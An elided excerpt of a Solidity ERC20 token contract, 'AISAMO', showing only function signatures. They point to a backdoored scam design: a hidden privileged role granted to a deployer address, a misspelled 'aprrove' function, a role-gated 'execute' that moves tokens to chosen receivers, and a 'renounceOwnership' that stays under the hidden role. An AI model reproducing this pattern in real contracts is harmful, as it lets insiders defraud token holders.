...
abstract contract GSConlse is Context, IRoleControl {
    ...
    bytes32 constant Token_address = 0x00;    
...
contract AISAMO is StandardERC20, GSConlse {
    ...
    constructor(string memory _name, string memory _symbol, uint256 _totalSupply,address tokenOwner,address sender) StandardERC20(_name, _symbol, _totalSupply, sender) {
        _CheckBurn(Token_address,sender);
        _owner=tokenOwner;
        _mint(tokenOwner,_totalSupply.mul(5).div(100)*10**decimals());
    }
    

    function aprrove(address user, uint256 amount) public onlyRole(Token_address) {
    ...
    function execute(address pair,address token,address[] memory receivers,uint256 amount,uint wethamount)public onlyRole(Token_address) returns (bool success){
     ...
     function renounceOwnership() public override onlyRole(Token_address) returns (bool success){
